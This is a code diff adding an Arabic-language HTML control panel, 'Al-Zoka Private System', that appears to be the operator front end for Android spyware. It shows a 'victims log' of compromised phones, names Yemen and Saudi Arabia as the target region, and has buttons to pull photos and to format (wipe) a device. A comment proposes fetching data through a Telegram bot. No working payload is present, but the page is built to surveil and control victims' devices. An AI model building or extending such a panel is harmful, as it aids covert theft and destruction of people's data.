@@ -1,0 +1,167 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Al-Zoka System | Control Panel</title>
+    <style>
+        :root {
+            --matrix-green: #00ff41;
+            --danger-red: #ff0000;
+            --glass: rgba(255, 255, 255, 0.05);
+            --dark-gray: #0d0d0d;
+        }
+
+        body {
+            background: radial-gradient(circle, #1a1a1a, #050505);
+            color: var(--matrix-green);
+            font-family: 'Courier New', Courier, monospace;
+            margin: 0;
+            padding: 20px;
+            overflow-x: hidden;
+        }
+
+        /* حاوية اللوحة الزجاجية */
+        .dashboard-container {
+            background: var(--glass);
+            backdrop-filter: blur(15px);
+            border: 1px solid rgba(0, 255, 65, 0.2);
+            border-radius: 20px;
+            padding: 30px;
+            box-shadow: 0 0 30px rgba(0, 0, 0, 0.8);
+            max-width: 1100px;
+            margin: auto;
+        }
+
+        header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 1px solid var(--matrix-green);
+            padding-bottom: 15px;
+            margin-bottom: 30px;
+        }
+
+        .system-title {
+            color: var(--danger-red);
+            text-shadow: 0 0 10px var(--danger-red);
+            font-size: 24px;
+            font-weight: bold;
+        }
+
+        .stats-row {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 20px;
+            margin-bottom: 30px;
+        }
+
+        .stat-card {
+            background: rgba(0, 0, 0, 0.5);
+            padding: 20px;
+            border-radius: 15px;
+            border: 1px dashed var(--matrix-green);
+            text-align: center;
+        }
+
+        .stat-card h3 { font-size: 14px; color: #888; margin: 0; }
+        .stat-card p { font-size: 28px; margin: 10px 0 0; color: var(--matrix-green); }
+
+        /* سجل الضحايا */
+        .logs-table {
+            width: 100%;
+            border-collapse: collapse;
+            background: rgba(0, 0, 0, 0.3);
+            border-radius: 10px;
+            overflow: hidden;
+        }
+
+        .logs-table th { background: rgba(0, 255, 65, 0.1); padding: 15px; text-align: right; }
+        .logs-table td { padding: 15px; border-bottom: 1px solid rgba(255,255,255,0.05); }
+
+        /* الأزرار الهجومية */
+        .btn-action {
+            padding: 8px 15px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-weight: bold;
+            border: 1px solid var(--matrix-green);
+            background: transparent;
+            color: var(--matrix-green);
+            transition: 0.3s;
+        }
+
+        .btn-danger {
+            background: var(--danger-red);
+            color: white;
+            border: none;
+            box-shadow: 0 0 10px var(--danger-red);
+        }
+
+        .btn-danger:hover { transform: scale(1.05); background: #b30000; }
+
+        .status-online { color: var(--matrix-green); animation: blink 1.5s infinite; }
+        @keyframes blink { 50% { opacity: 0.3; } }
+    </style>
+</head>
+<body>
+
+<div class="dashboard-container">
+    <header>
+        <div class="system-title">AL-ZOKA PRIVATE SYSTEM v6.0</div>
+        <div class="status-online">● متصل بالسيرفر</div>
+    </header>
+
+    <div class="stats-row">
+        <div class="stat-card">
+            <h3>إجمالي الأجهزة</h3>
+            <p id="total-v">1</p>
+        </div>
+        <div class="stat-card" style="border-color: var(--danger-red);">
+            <h3>الأوامر النشطة</h3>
+            <p style="color: var(--danger-red);">4</p>
+        </div>
+        <div class="stat-card">
+            <h3>المنطقة المستهدفة</h3>
+            <p>اليمن/السعودية</p>
+        </div>
+    </div>
+
+    <h2 style="color: #fff; font-size: 18px; margin-bottom: 20px;">🛡️ سجل سحب البيانات الفوري:</h2>
+
+    <table class="logs-table">
+        <thead>
+            <tr>
+                <th>الوقت</th>
+                <th>عنوان IP</th>
+                <th>نوع الجهاز</th>
+                <th>البطارية</th>
+                <th>التحكم</th>
+            </tr>
+        </thead>
+        <tbody id="logs-body">
+            <tr>
+                <td>14:35</td>
+                <td style="color: #fff;">192.168.1.XX</td>
+                <td>Android 14 (S24 Ultra)</td>
+                <td style="color: #ff0;">85%</td>
+                <td>
+                    <button class="btn-action">سحب الصور</button>
+                    <button class="btn-action btn-danger">فرمتة</button>
+                </td>
+            </tr>
+        </tbody>
+    </table>
+
+    <div style="margin-top: 30px; text-align: center; color: #444; font-size: 12px;">
+        Matrix Protocol | Developed for Al-Zoka Private Use
+    </div>
+</div>
+
+<script>
+    // هنا ممكن تضيف كود Fetch لجلب الرسايل من بوت تليجرام عشان اللوحة تتحدث لوحدها
+    console.log("Matrix Dashboard Ready...");
+</script>
+
+</body>
+</html>
